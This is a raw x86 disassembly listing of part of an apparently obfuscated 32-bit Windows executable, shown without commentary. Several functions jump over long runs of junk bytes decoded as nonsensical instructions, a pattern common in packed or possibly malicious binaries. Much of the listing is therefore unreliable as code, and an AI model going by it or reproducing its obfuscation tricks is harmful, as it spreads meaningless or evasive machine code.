  4053d1:	sub    DWORD PTR ds:0x424850,0x41074b
  4053db:	mov    DWORD PTR [edx],eax
  4053dd:	mov    eax,DWORD PTR [ebp+0xc]
  4053e0:	xor    eax,ecx
  4053e2:	push   esi
  4053e3:	add    DWORD PTR ds:0x44b6e4,0x2efc
  4053ed:	mov    esi,DWORD PTR [ebp+0x10]
  4053f0:	mov    edx,0x32729e
  4053f5:	sub    DWORD PTR ds:0x44e428,0x7c97
  4053ff:	add    eax,edx
  405401:	xor    DWORD PTR ds:0x44e428,0x44b6dc
  40540b:	mov    DWORD PTR [esi+0x4],eax
  40540e:	mov    DWORD PTR ds:0x44e424,0x1d
  405418:	cmp    DWORD PTR ds:0x44e424,0x0
  40541f:	je     0x405452
  405425:	cmp    DWORD PTR ds:0x44e424,0x21
  40542c:	jne    0x405442
  405432:	push   0x4107d0
  405437:	push   0x400000
  40543c:	call   DWORD PTR ds:0x4430dc
  405442:	mov    eax,ds:0x44e424
  405447:	dec    eax
  405448:	mov    ds:0x44e424,eax
  40544d:	jmp    0x405418
  405452:	mov    eax,DWORD PTR [ebp+0x14]
  405455:	mov    esi,DWORD PTR [ebp+0x10]
  405458:	mov    DWORD PTR [esi+0x8],eax
  40545b:	mov    eax,DWORD PTR [ebp+0x18]
  40545e:	mov    esi,DWORD PTR [ebp+0x10]
  405461:	mov    DWORD PTR [esi+0xc],eax
  405464:	mov    eax,DWORD PTR [ebp+0x1c]
  405467:	mov    esi,DWORD PTR [ebp+0x10]
  40546a:	mov    DWORD PTR [esi+0x10],eax
  40546d:	mov    eax,eax
  40546f:	mov    eax,DWORD PTR [ebp+0x8]
  405472:	xor    eax,ecx
  405474:	add    eax,edx
  405476:	pop    esi
  405477:	leave  
  405478:	ret    0x18
  40547b:	push   ebp
  40547c:	mov    ebp,esp
  40547e:	mov    eax,DWORD PTR [ebp+0xc]
  405481:	xor    edx,edx
  405483:	mov    ecx,0x7264fcad
  405488:	jmp    0x40559b
  40548d:	enter  0x8006,0xb
  405491:	inc    edx
  405492:	lea    ebx,[ebx-0x27]
  405495:	mov    dl,0x23
  405497:	sub    dh,BYTE PTR [eax]
  405499:	dec    edx
  40549a:	sub    ebp,DWORD PTR [ebx]
  40549c:	mov    ds:0x7c7c2b2a,eax
  4054a1:	bound  edi,QWORD PTR [esp+edi*2+0x7c]
  4054a5:	push   ebx
  4054a6:	inc    esp
  4054a7:	dec    esp
  4054a8:	pop    ds
  4054a9:	in     eax,0x79
  4054ab:	test   al,0xd5
  4054ad:	mov    ah,0x42
  4054af:	clc    
  4054b0:	icebp  
  4054b1:	fisttp DWORD PTR [ebp+0x1885ceca]
  4054b7:	and    eax,0x7cbd7254
  4054bc:	jo     0x405445
  4054be:	push   es
  4054bf:	or     al,0xdb
  4054c1:	ret    0x24ed
  4054c4:	jle    0x405521
  4054c6:	ret    0xbb6b
  4054c9:	mov    ch,0x81
  4054cb:	dec    edi
  4054cc:	inc    ebx
  4054cd:	ds or  edx,ebp
  4054d0:	push   es
  4054d1:	cld    
  4054d2:	aas    
  4054d3:	or     ecx,edx
  4054d5:	xchg   esp,eax
  4054d6:	fstp   TBYTE PTR [edi+0x6351c60c]
  4054dc:	idiv   DWORD PTR [ebx+0x7206b652]
  4054e2:	sbb    dl,BYTE PTR [ebx+0x1e]
  4054e5:	call   0xfbe98190
  4054ea:	aam    0x25
  4054ec:	test   BYTE PTR [edx-0xc],dl
  4054ef:	pusha  
  4054f0:	pop    ds
  4054f1:	push   edx
  4054f2:	jbe    0x4054df
  4054f4:	call   0xebf2:0x81ef7e7f
  4054fb:	cmp    DWORD PTR [edi],ecx
  4054fd:	jp     0x405493
  4054ff:	jg     0x4054cc
  405501:	and    ah,BYTE PTR [eax]
  405503:	fnstsw WORD PTR [edi+ecx*4-0x126acc41]
  40550a:	nop
  40550b:	and    DWORD PTR [esi],esp
  40550d:	adc    al,0x3b
  40550f:	mov    ah,0xd6
  405511:	xor    eax,0x3c368703
  405516:	pop    edi
  405517:	stos   BYTE PTR es:[edi],al
  405518:	sub    eax,0x9b4da9f2
  40551d:	pop    eax
  40551e:	and    al,0x8d
  405520:	mov    ah,0x93
  405522:	gs inc edi
  405524:	sub    al,0xdc
  405526:	pushf  
  405527:	pusha  
  405528:	or     esi,0x78e16809
  40552e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40552f:	in     eax,0xc0
  405531:	sbb    dl,bl
  405533:	ds test al,dl
  405536:	ins    DWORD PTR es:[edi],dx
  405537:	sbb    eax,0xb3eb960b
  40553c:	jne    0x4054cd
  40553e:	push   ds
  40553f:	or     ah,BYTE PTR [ebx]
  405541:	fwait
  405542:	or     ecx,0xc4172be
  405548:	sub    al,0x22
  40554a:	pop    esp
  40554b:	mov    ebp,0xa35e8d10
  405550:	mov    ah,0xba
  405552:	or     edi,DWORD PTR ds:[eax-0x1e]
  405556:	repnz (bad) 
  405558:	xor    BYTE PTR [edi],ah
  40555a:	mov    al,0x51
  40555c:	lock lock sub ah,bl
  405560:	fsubr  QWORD PTR [ebx]
  405562:	pushf  
  405563:	outs   dx,BYTE PTR ds:[esi]
  405564:	and    BYTE PTR [eax+edi*8-0x11],dh
  405568:	outs   dx,DWORD PTR ds:[esi]
  405569:	popa   
  40556a:	mov    bl,0xac
  40556c:	gs out dx,al
  40556e:	dec    esp
  40556f:	xor    al,0x86
  405571:	cmp    eax,0xaaae0804
  405576:	inc    ebp
  405577:	jecxz  0x40554f
  405579:	out    dx,eax
  40557a:	pop    eax
  40557b:	add    esi,DWORD PTR [edi+0x66]
  40557e:	push   esp
  40557f:	hlt    
  405580:	push   es
  405581:	das    
  405582:	xlat   BYTE PTR ds:[ebx]
  405583:	mov    edi,0xaecf9457
  405588:	and    dl,BYTE PTR [ebp-0x7d47c880]
  40558e:	sub    edi,DWORD PTR [ecx]
  405590:	xlat   BYTE PTR fs:[ebx]
  405592:	mov    ds:0x804a8f94,al
  405597:	sbb    eax,0xf703eba6
  40559c:	icebp  
  40559d:	mov    ecx,DWORD PTR [ebp+0x10]
  4055a0:	and    ecx,eax
  4055a2:	or     ecx,0x81161d8f
  4055a8:	mov    eax,ecx
  4055aa:	pop    ebp
  4055ab:	ret    0x18
  4055ae:	push   ebp
  4055af:	mov    ebp,esp
  4055b1:	push   ecx
  4055b2:	xor    edx,edx
  4055b4:	xor    edx,DWORD PTR ds:0x4454d4
  4055ba:	xor    ecx,ecx
  4055bc:	or     ecx,DWORD PTR ds:0x44b700
  4055c2:	sub    edx,ecx
  4055c4:	sub    edx,DWORD PTR [edx+ecx*1]
  4055c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4055ce:	movzx  eax,WORD PTR ds:0x44e424
  4055d5:	adc    DWORD PTR ds:0x42483c,eax
  4055db:	jmp    0x405714
  4055e0:	ins    DWORD PTR es:[edi],dx
  4055e1:	je     0x40559f
  4055e3:	xchg   DWORD PTR [ebp+0x47],edx
  4055e6:	jge    0x4055e2
  4055e8:	fs pop ebp
  4055ea:	mov    eax,0xe6a12377
  4055ef:	mov    ss,WORD PTR [eax]
  4055f1:	sub    bh,BYTE PTR [esp+edi*2+0x18]
  4055f5:	jg     0x405673
  4055f7:	jl     0x405623
  4055f9:	mov    ecx,0xbeadda5d
  4055fe:	xor    eax,0x5584b255
  405603:	fwait
  405604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405605:	jmp    0x4055c2
  405607:	xor    BYTE PTR [eax],0x3a
  40560a:	inc    esp
  40560b:	arpl   WORD PTR [esi-0x2],di
  40560e:	leave  
  40560f:	fild   DWORD PTR [ebp+0x4550603b]
  405615:	mov    WORD PTR [edi],ds
  405617:	dec    edi
  405618:	repnz imul eax,DWORD PTR [esi],0x14364ab6
  40561f:	loope  0x4055d6
  405621:	mov    cs,WORD PTR [edi+ebp*1]
  405624:	sbb    eax,0x7565cdf0
  405629:	pop    ds
  40562a:	sub    al,0x69
  40562c:	out    dx,al
  40562d:	add    edi,edi
  40562f:	outs   dx,DWORD PTR ds:[esi]
  405630:	dec    ecx
  405631:	xchg   bh,ah
  405633:	push   ebx
  405634:	rcr    BYTE PTR ds:0xac237be7,0x60
  40563b:	arpl   WORD PTR [esi+0x5130d5ae],bx
  405641:	(bad)  
  405642:	xchg   edi,eax
  405643:	mov    ebp,0xf539380f
  405648:	aaa    
  405649:	inc    esp
  40564a:	(bad)  
  40564b:	mov    al,0xaf
  40564d:	inc    ebp
  40564e:	push   esi
  405650:	fist   WORD PTR [eax]
  405652:	jae    0x405680
  405654:	ret    0xc087
  405657:	in     eax,0x2f
  405659:	shl    BYTE PTR ds:0x51406dd2,0x22
  405660:	and    DWORD PTR [esi-0x5e8ef184],eax
  405666:	out    dx,eax
  405667:	ins    DWORD PTR es:[edi],dx
  405668:	jne    0x4056d4
  40566a:	push   ecx
  40566b:	xor    al,BYTE PTR [edi+edi*8-0xa]
  40566f:	in     al,0x13
  405671:	leave  
  405672:	add    al,0xfe
  405674:	repz push 0x44
  405677:	jle    0x405653
  405679:	or     DWORD PTR [eax+0xc],edx
  40567c:	(bad)  
  40567d:	enter  0xe723,0x56
  405681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405682:	sbb    BYTE PTR ds:0x8a38fac6,dh
  405688:	jnp    0x405680
  40568a:	jns    0x405668
  40568c:	addr16 inc ebx
  40568e:	sub    BYTE PTR [ebx-0x25329dd1],0x2b
  405695:	mov    dl,0x7d
  405697:	push   cs
  405698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405699:	ficomp DWORD PTR [ebp+0x32]
  40569c:	mov    ebp,0x994c96a0
  4056a1:	or     dl,BYTE PTR [esi+0x61bad09a]
  4056a7:	data16 fimul WORD PTR [edx]
  4056aa:	xchg   ebx,eax
  4056ab:	imul   ebp,DWORD PTR ss:[edi-0x6e],0x902895ef
  4056b3:	mov    eax,0xa90d68f1
  4056b8:	mov    ebx,0xe4ccb1e6
  4056bd:	jl     0x405697
  4056bf:	(bad)  
  4056c0:	popa   
  4056c1:	aas    
  4056c2:	imul   ecx,DWORD PTR [edx],0x6bf650d4
  4056c8:	jmp    0x405743
  4056ca:	iret   
  4056cb:	xchg   ebp,eax
  4056cc:	nop
  4056cd:	call   0xf4c7:0xe6a60c9d
  4056d4:	pop    es
  4056d5:	lahf   
  4056d6:	dec    edi
  4056d7:	sbb    eax,0xfd6fb199
  4056dc:	ficom  DWORD PTR [ebx]
  4056de:	cmc    
  4056df:	push   ss
  4056e0:	pop    ss
  4056e1:	pop    eax
  4056e2:	cmp    al,0x4f
  4056e4:	bound  esi,QWORD PTR ds:0x89b68a44
  4056ea:	mov    ecx,0xef129201
  4056ef:	repnz in eax,dx
  4056f1:	scas   al,BYTE PTR es:[edi]
  4056f2:	outs   dx,DWORD PTR ds:[esi]
  4056f3:	scas   eax,DWORD PTR es:[edi]
  4056f4:	je     0x405770
  4056f6:	imul   edi,ebp,0xfffffff9
  4056f9:	jp     0x4056ec
  4056fb:	dec    esp
  4056fc:	out    dx,al
  4056fd:	in     eax,0x4d
  4056ff:	mov    ebp,0x70ea3714
  405704:	mov    DWORD PTR [ecx],0x87e63957
  40570a:	pop    ebp
  40570b:	push   ss
  40570c:	mov    ecx,0x1bfe75de
  405711:	repz ss (bad) 
  405714:	mov    eax,DWORD PTR [ebp-0x4]
  405717:	mov    edx,DWORD PTR [ebp+0x10]
  40571a:	or     ecx,0x2821
  405720:	mov    ecx,0x7510857
  405725:	not    DWORD PTR ds:0x424858
  40572b:	jmp    0x405864
  405730:	xor    al,dh
  405732:	push   0x65
  405734:	jp     0x40579b
  405736:	fnstsw WORD PTR [ecx-0x7c]
  405739:	mov    ebp,0xf210b79
  40573e:	push   ecx
  40573f:	sbb    bh,BYTE PTR [ebp*1+0x7f187c7c]
  405746:	jl     0x4057c4
  405748:	call   0xcd87:0x967f4152
  40574f:	cwde   
  405750:	imul   esp,DWORD PTR [edi],0xd6ee58ed
  405756:	mov    bl,0xa5
  405758:	push   ss
  405759:	push   ebx
  40575a:	or     eax,0x3467250a
  40575f:	add    eax,DWORD PTR [esi]
  405761:	and    BYTE PTR [edi],dl
  405763:	xor    dl,0xd7
  405766:	dec    esi
  405767:	cli    
  405768:	push   0x3051456f
  40576d:	ja     0x40570f
  40576f:	add    eax,0x904204dd
  405774:	adc    al,0xd4
  405776:	adc    ebp,ebx
  405778:	xchg   ecx,eax
  405779:	inc    ebx
  40577a:	mov    ebp,0x664f242c
  40577f:	clc    
  405780:	aas    
  405781:	mov    WORD PTR [ecx+0x41],gs
  405784:	inc    ebx
  405785:	mov    esi,0xa706c830
  40578a:	bnd jp 0x405716
  40578d:	and    BYTE PTR [ecx+0x74],ah
  405790:	lahf   
  405791:	sahf   
  405792:	xor    al,0xcd
  405794:	outs   dx,BYTE PTR ds:[esi]
  405795:	es test al,0xf6
  405798:	adc    BYTE PTR [ecx-0x29],ch
  40579b:	jmp    0xe20da3f1
  4057a0:	jne    0x4057d7
  4057a2:	push   cs
  4057a3:	shl    esp,0x9a
  4057a6:	sbb    ebx,ebp
  4057a8:	mov    DWORD PTR [esi-0x6a471bdb],ebp
  4057ae:	xchg   ebp,eax
  4057af:	test   DWORD PTR [ebx],0xe7e1844d
  4057b5:	(bad)  
  4057b6:	and    eax,0xe3ffba3e
  4057bb:	xor    ecx,DWORD PTR [ecx]
  4057bd:	fs inc edx
  4057bf:	ret    0xbb08
  4057c2:	dec    ebp
  4057c3:	addr16 jb 0x405780
  4057c6:	dec    ebx
  4057c7:	push   ds
  4057c8:	add    eax,0x3d1e2f35
  4057cd:	sti    
  4057ce:	fnstcw WORD PTR [ebx+ebx*8+0x56]
  4057d2:	shr    BYTE PTR [ebx],1
  4057d4:	push   esi
  4057d5:	jecxz  0x405835
  4057d7:	lods   eax,DWORD PTR ds:[esi]
  4057d8:	fucomi st,st(1)
  4057da:	sbb    al,0x56
  4057dc:	mov    ah,0x12
  4057de:	pop    es
  4057df:	mov    ah,0x8d
  4057e1:	push   cs
  4057e2:	xchg   edx,eax
  4057e3:	sub    ebx,DWORD PTR [ecx]
  4057e5:	ret    0xa5bb
  4057e8:	das    
  4057e9:	enter  0x96b0,0x68
  4057ed:	shl    BYTE PTR [edx-0x7a21cadb],0xa8
  4057f4:	das    
  4057f5:	pop    ebx
  4057f6:	fiadd  WORD PTR [esi]
  4057f8:	retf   
  4057f9:	mov    dh,0x34
  4057fb:	sbb    DWORD PTR [ebp+edi*2-0x4f],esp
  4057ff:	mov    cl,0x66
  405801:	scas   eax,DWORD PTR es:[edi]
  405802:	sbb    eax,0xf7adc5db
  405807:	mov    ecx,0x1aba937c
  40580c:	cmp    BYTE PTR [edi],ch
  40580e:	(bad)  
  40580f:	pop    ebp
  405810:	mov    dl,0x5c
  405812:	(bad)  
  405813:	xchg   edi,eax
  405814:	xchg   esp,eax
  405815:	mov    ds:0xecf66755,al
  40581a:	adc    ebx,DWORD PTR [edi]
  40581c:	jp     0x4057d0
  40581e:	das    
  40581f:	stos   DWORD PTR es:[edi],eax
  405820:	inc    edi
  405821:	call   0x6a9a:0xf2717740
  405828:	sbb    BYTE PTR [esi+0x295d594b],al
  40582e:	adc    ebp,DWORD PTR [eax-0x35061a9c]
  405834:	cmp    esi,DWORD PTR [eax]
  405836:	popa   
  405837:	pop    edx
  405838:	pop    ds
  405839:	rcr    ch,0xee
  40583c:	xor    DWORD PTR [edx-0x4c],edi
  40583f:	cmp    DWORD PTR [eax+0x5a],0x79d7df3
  405846:	mov    ds:0xaba79378,eax
  40584b:	in     al,dx
  40584c:	dec    esp
  40584d:	pop    es
  40584e:	sbb    eax,0xbf36bb04
  405853:	out    0xd7,al
  405855:	aad    0xe1
  405857:	movups xmm4,XMMWORD PTR [edi+esi*2+0x7b8bf07f]
  40585f:	daa    
  405860:	call   0x337d9069
  405865:	rol    DWORD PTR ds:0x32729e,0x81
  40586c:	or     eax,0x424850
  405871:	test   BYTE PTR [ecx+0x2890044],cl
  405877:	neg    edx
  405879:	mov    eax,DWORD PTR [ebp+0x14]
  40587c:	and    DWORD PTR ds:0x448994,0x0
  405886:	xor    edx,edx
  405888:	add    edx,DWORD PTR ds:0x448994
  40588e:	inc    edx
  40588f:	mov    DWORD PTR ds:0x448994,edx
  405895:	cmp    DWORD PTR ds:0x448994,0x14
  40589c:	jne    0x4058b0
  4058a2:	push   DWORD PTR [ebp-0x28]
  4058a5:	push   0x4489a4
  4058aa:	call   DWORD PTR ds:0x443360
  4058b0:	cmp    DWORD PTR ds:0x448994,0x13
  4058b7:	jb     0x405886
  4058bd:	mov    edx,DWORD PTR [ebp+0x10]
  4058c0:	mov    DWORD PTR [edx+0x4],eax
  4058c3:	mov    eax,DWORD PTR [ebp+0x18]
  4058c6:	mov    edx,DWORD PTR [ebp+0x10]
  4058c9:	mov    DWORD PTR [edx+0x8],eax
  4058cc:	mov    eax,DWORD PTR [ebp+0x1c]
  4058cf:	mov    edx,DWORD PTR [ebp+0x10]
  4058d2:	jmp    0x405a0b
  4058d7:	in     eax,0xab
  4058d9:	ins    DWORD PTR es:[edi],dx
  4058da:	push   es
  4058db:	jge    0x4058a3
  4058dd:	imul   edi,DWORD PTR gs:[ecx],0x49
  4058e1:	mov    al,ds:0x1f8cceb9
  4058e6:	pop    ds
  4058e7:	fsubr  DWORD PTR [esp+edi*2]
  4058ea:	jl     0x405904
  4058ec:	jg     0x40596a
  4058ee:	jl     0x405870
  4058f0:	in     eax,0xc6
  4058f2:	cwde   
  4058f3:	enter  0xc538,0x60
  4058f7:	lods   eax,DWORD PTR ds:[esi]
  4058f8:	cmp    dh,bl
  4058fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058fb:	fdivr  DWORD PTR [esi+edx*1-0x7b]
  4058ff:	iret   
  405900:	das    
  405901:	push   ss
  405902:	ins    BYTE PTR es:[edi],dx
  405903:	imul   ebx,DWORD PTR [ebp+0x59],0x96bd5d6b
  40590a:	mov    eax,0x34e20553
  40590f:	inc    ebx
  405910:	popf   
  405911:	jg     0x4058cd
  405913:	and    ebx,0xffffffbe
  405916:	mov    WORD PTR [ebx+edi*1+0x3a70e321],fs
  40591d:	outs   dx,BYTE PTR ds:[esi]
  40591e:	xchg   edi,eax
  40591f:	imul   ebx,DWORD PTR [ebx+0x54130608],0x13
  405926:	shl    BYTE PTR [esi+0x7249321c],1
  40592c:	shl    BYTE PTR [esi+ebp*4-0x6f87c9c5],cl
  405933:	in     eax,0x74
  405935:	push   0xbf8410ef
  40593a:	pushf  
  40593b:	lahf   
  40593c:	pop    edx
  40593d:	xchg   ebp,eax
  40593e:	adc    dh,BYTE PTR [edx-0x63915781]
  405944:	lods   eax,DWORD PTR es:[esi]
  405946:	inc    edi
  405947:	jne    0x4059af
  405949:	bound  ebx,QWORD PTR [edx+0x52daa270]
  40594f:	add    al,0x85
  405951:	fldenv [ebx+0x6302ff88]
  405957:	adc    eax,0xf36f7faa
  40595c:	outs   dx,BYTE PTR ds:[esi]
  40595d:	mov    cl,0x62
  40595f:	ds jge 0x405936
  405962:	mov    dl,0x5c
  405964:	mov    cs,WORD PTR [ebx]
  405966:	das    
  405967:	in     eax,dx
  405968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405969:	(bad)  
  40596b:	sub    DWORD PTR [ebx-0x4c400a64],edx
  405971:	push   0x3a
  405973:	mov    cs,WORD PTR [ecx-0x173a378a]
  405979:	inc    ebp
  40597a:	dec    ebp
  40597b:	xor    eax,0x86a65925
  405980:	add    bh,BYTE PTR [ebx-0x18029edf]
  405986:	aaa    
  405987:	adc    ecx,ecx
  405989:	jns    0x4059f7
  40598b:	loopne 0x405940
  40598d:	xor    al,0x2e
  40598f:	and    esp,DWORD PTR [esp+edx*2-0x46beae58]
  405996:	jnp    0x40594d
  405998:	imul   edi,DWORD PTR [eax+0x3aa0b89c],0x22
  40599f:	pop    ss
  4059a0:	aad    0xb7
  4059a2:	fsubr  QWORD PTR [edi+ecx*2]
  4059a5:	and    al,BYTE PTR [esi+0x30d054b7]
  4059ab:	jnp    0x405a06
  4059ad:	mov    ds:0x3a87caca,eax
  4059b2:	rcr    ecx,0x4a
  4059b5:	and    eax,DWORD PTR [eax+0x32]
  4059b8:	mov    WORD PTR ds:0x8267bede,?
  4059be:	sar    DWORD PTR [edi+0x3a58349f],cl
  4059c4:	fldcw  WORD PTR ds:0x965ffa21
  4059ca:	mov    eax,0x208011d3
  4059cf:	jecxz  0x405a05
  4059d1:	cdq    
  4059d2:	mov    DWORD PTR [eax],esi
  4059d4:	dec    ebp
  4059d5:	ret    0x561c
  4059d8:	stc    
  4059d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059da:	add    BYTE PTR ds:0x7b7622a2,ah
  4059e0:	jge    0x405a0e
  4059e2:	pop    ss
  4059e3:	xchg   esi,eax
  4059e4:	and    cl,ah
  4059e6:	bound  ebx,QWORD PTR [edi-0x69]
  4059e9:	gs pop esp
  4059eb:	cmp    dh,bh
  4059ed:	push   0x6ccc180a
  4059f2:	test   eax,0xf84058c4
  4059f7:	cmp    eax,0x92aa43d6
  4059fc:	sahf   
  4059fd:	adc    esp,ebp
  4059ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a00:	aad    0x76
  405a02:	inc    ecx
  405a03:	out    dx,al
  405a04:	jg     0x4059e0
  405a06:	mov    al,0xc6
  405a08:	mov    eax,0x428999e2
  405a0d:	or     al,0x8b
  405a0f:	inc    ebp
  405a10:	and    BYTE PTR [ebx+0x42891055],cl
  405a16:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405a1c:	test   eax,eax
  405a1e:	jmp    0x405b57
  405a23:	pop    edx
  405a24:	loope  0x405a4a
  405a26:	sbb    bh,BYTE PTR [ebx+0x5f617add]
  405a2c:	retf   
  405a2d:	mov    cl,0x6b
  405a2f:	cmp    al,0x51
  405a31:	sbb    esi,DWORD PTR [eax]
  405a33:	in     al,0x2f
  405a35:	jl     0x405ab3
  405a37:	sbb    BYTE PTR [edi+0x7c],bh
  405a3a:	jl     0x405aae
  405a3c:	xchg   edi,eax
  405a3d:	sahf   
  405a3e:	and    al,0x98
  405a40:	sbb    al,0xe8
  405a42:	dec    ebx
  405a43:	xchg   esp,eax
  405a44:	repnz or BYTE PTR [ebx],bl
  405a47:	sub    al,0xad
  405a49:	in     al,dx
  405a4a:	push   ss
  405a4b:	xor    al,0xc9
  405a4d:	pusha  
  405a4e:	jae    0x405a3f
  405a50:	mov    edx,0x21f5a657
  405a55:	sbb    eax,0x26e5ca04
  405a5a:	xor    bh,ah
  405a5c:	and    ah,0x5b
  405a5f:	cdq    
  405a60:	out    0xb6,al
  405a62:	mov    cl,0x2e
  405a64:	test   DWORD PTR [ecx+0x4371da2],edi
  405a6a:	jge    0x405a25
  405a6c:	cvtpi2ps xmm1,QWORD PTR [esi]
  405a6f:	dec    edi
  405a70:	scas   al,BYTE PTR es:[edi]
  405a71:	xor    DWORD PTR [ecx+0x46],ecx
  405a74:	popf   
  405a75:	or     DWORD PTR [ebp-0xd],esp
  405a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a79:	adc    ch,dh
  405a7b:	pmulhw mm4,QWORD PTR [eax-0x34df6f3f]
  405a82:	(bad)  
  405a83:	repnz sub dl,bh
  405a86:	mov    esp,0x2fb95576
  405a8b:	fs xchg esi,eax
  405a8d:	xor    eax,0x957b6afe
  405a92:	(bad)  
  405a93:	out    dx,eax
  405a94:	jecxz  0x405aa2
  405a96:	repnz loop 0x405a2d
  405a99:	push   edx
  405a9a:	or     dh,BYTE PTR [edx+0x69]
  405a9d:	aad    0x90
  405a9f:	push   cs
  405aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aa1:	fld    QWORD PTR [edx-0x27d00946]
  405aa7:	and    eax,0x6bc2a28c
  405aac:	fdiv   st(0),st
  405aae:	ret    0x1b8
  405ab1:	aad    0xa3
  405ab3:	sbb    bh,bl
  405ab5:	dec    ecx
  405ab6:	xor    DWORD PTR [edx+esi*2-0x43],edx
  405aba:	or     al,0xb7
  405abc:	and    ecx,DWORD PTR [edx+0x35]
  405abf:	fist   DWORD PTR [edi]
  405ac1:	(bad)  
  405ac2:	adc    bh,BYTE PTR [edx-0x4d]
  405ac5:	out    dx,al
  405ac6:	or     eax,0xe7e01bc4
  405acb:	outs   dx,DWORD PTR ds:[esi]
  405acc:	fistp  QWORD PTR [esi+0x39]
  405acf:	jnp    0x405b47
  405ad1:	mov    bh,0x36
  405ad3:	lods   al,BYTE PTR ds:[esi]
  405ad4:	or     DWORD PTR [ebx+0x2d],ebp
  405ad7:	es mov edi,0x670c30f2
  405add:	add    bh,BYTE PTR [edi+ebp*8]
  405ae0:	fidiv  WORD PTR [esi+0x53]
  405ae3:	into   
  405ae4:	inc    edi
  405ae5:	cmc    
  405ae6:	cmc    
  405ae7:	inc    ebx
  405ae8:	je     0x405b51
  405aea:	sbb    al,0xa
  405aec:	pop    esp
  405aed:	sub    edx,eax
  405aef:	and    bh,cl
  405af1:	cs sbb al,0x44
  405af4:	jae    0x405aba
  405af6:	icebp  
  405af7:	cld    
  405af8:	(bad)  
  405af9:	bnd jl 0x405b63
  405afc:	fidiv  WORD PTR [edx-0x16d2a57c]
  405b02:	lods   eax,DWORD PTR ds:[esi]
  405b03:	or     BYTE PTR [esi],bh
  405b05:	aad    0xd7
  405b07:	or     edx,DWORD PTR [eax+0x22]
  405b0a:	scas   eax,DWORD PTR es:[edi]
  405b0b:	xor    DWORD PTR [eax-0x5],eax
  405b0e:	cmp    ch,dh
  405b10:	xchg   BYTE PTR [edx],cl
  405b12:	mov    al,al
  405b14:	pop    eax
  405b15:	jge    0x405b95
  405b17:	mov    ebx,0xaf65976
  405b1c:	mov    esi,fs
  405b1e:	fsub   DWORD PTR [edi+0x64]
  405b21:	xor    esi,ebp
  405b23:	jo     0x405ad7
  405b25:	outs   dx,BYTE PTR ds:[esi]
  405b26:	test   eax,0xdba74327
  405b2b:	es xor eax,0x5bcb8c91
  405b31:	and    dh,BYTE PTR [edx+0x4b]
  405b34:	sahf   
  405b35:	scas   al,BYTE PTR es:[edi]
  405b36:	mov    dh,0x32
  405b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b39:	outs   dx,DWORD PTR ds:[esi]
  405b3a:	in     eax,dx
  405b3b:	pop    ebx
  405b3c:	jmp    0xa4d6871f
  405b41:	ja     0x405b0b
  405b43:	dec    edi
  405b44:	retf   0x71c0
  405b47:	xor    ebp,esp
  405b49:	xor    DWORD PTR [eax-0x67b002d4],eax
  405b4f:	les    ecx,FWORD PTR [ecx-0x2b446776]
  405b55:	lods   eax,DWORD PTR ds:[esi]
  405b56:	cmp    eax,0xf08458b
  405b5b:	test   DWORD PTR [ebx],eax
  405b5d:	add    BYTE PTR [eax],al
  405b5f:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  405b65:	add    eax,0x32729e
  405b6a:	leave  
  405b6b:	ret    0x1c
  405b6e:	push   ebp
  405b6f:	mov    ebp,esp
  405b71:	sub    esp,0x78
  405b74:	adc    DWORD PTR ds:0x448988,0x7d94
  405b7e:	jmp    0x405caa
  405b83:	or     esp,ebx
  405b85:	dec    ecx
  405b86:	or     BYTE PTR [ecx-0x53],ch
  405b89:	dec    ebp
  405b8a:	aad    0x48
  405b8c:	aas    
  405b8d:	adc    esi,esp
  405b8f:	and    ebx,DWORD PTR [ebp+0x2e806b9c]
  405b95:	jl     0x405c13
  405b97:	or     eax,0xbd7c7c7f
  405b9c:	xor    DWORD PTR [ebp-0x30a46bb1],ebx
  405ba2:	push   edi
  405ba3:	fisubr DWORD PTR [edx-0xe]
  405ba6:	int    0x62
  405ba8:	(bad)  
  405ba9:	pop    esi
  405baa:	fcomp  QWORD PTR [ebx-0x31bc7ccc]
  405bb0:	imul   ebx,DWORD PTR [edx],0x78
  405bb3:	jmp    0xfc046f5e
  405bb8:	or     al,0xa1
  405bba:	or     DWORD PTR [ebx+0x40330847],ebp
  405bc0:	aam    0x2d
  405bc2:	mov    dh,dh
  405bc4:	lods   eax,DWORD PTR ds:[esi]
  405bc5:	add    eax,0x4c7f99c5
  405bca:	pop    ebp
  405bcb:	jne    0x405b8a
  405bcd:	jo     0x405bf8
  405bcf:	sub    DWORD PTR [ecx-0x28],0xfdb58b4e
  405bd6:	shl    esi,cl
  405bd8:	clc    
  405bd9:	out    dx,eax
  405bda:	pushf  
  405bdb:	mov    bl,0x51
  405bdd:	aaa    
  405bde:	push   0x539d0851
  405be3:	jmp    0x405bfd
  405be5:	jmp    0x405bca
  405be7:	das    
  405be8:	mov    edi,0xaf1e933b
  405bed:	cmp    BYTE PTR [esi],0xf
  405bf0:	adc    esp,ecx
  405bf2:	pop    esp
  405bf3:	and    bh,al
  405bf5:	mov    esi,DWORD PTR [esi+0x76]
  405bf8:	cld    
  405bf9:	rcr    DWORD PTR [esi+0x4c0c1980],0xb8
  405c00:	cmp    eax,0xcfe40cb5
  405c05:	bound  esp,QWORD PTR [edx]
  405c07:	pop    es
  405c08:	(bad)  
  405c09:	(bad)  
  405c0a:	adc    ah,dh
  405c0c:	es (bad) 
  405c0e:	ret    0xea6e
  405c11:	neg    BYTE PTR ds:[ecx+edi*8]
  405c15:	sub    dh,bl
  405c17:	lods   eax,DWORD PTR ds:[esi]
  405c18:	outs   dx,BYTE PTR ds:[esi]
  405c19:	fs sbb eax,0xe7365aa7
  405c1f:	test   al,0x49
  405c21:	repz in al,0xf8
  405c24:	or     BYTE PTR [edi-0x42],cl
  405c27:	aam    0x51
  405c29:	cmc    
  405c2a:	cmp    al,BYTE PTR [esi]
